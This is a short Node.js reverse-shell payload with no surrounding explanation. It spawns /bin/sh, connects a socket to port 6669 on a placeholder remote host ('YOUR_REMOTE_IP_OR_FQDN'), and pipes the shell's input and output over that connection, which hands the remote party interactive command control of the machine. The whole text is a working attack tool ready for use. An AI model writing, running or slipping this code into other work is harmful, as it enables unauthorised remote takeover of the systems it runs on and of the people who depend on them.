var net = require("net"), sh = require("child_process").exec("/bin/sh");
var client = new net.Socket();
client.connect(6669, "YOUR_REMOTE_IP_OR_FQDN", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
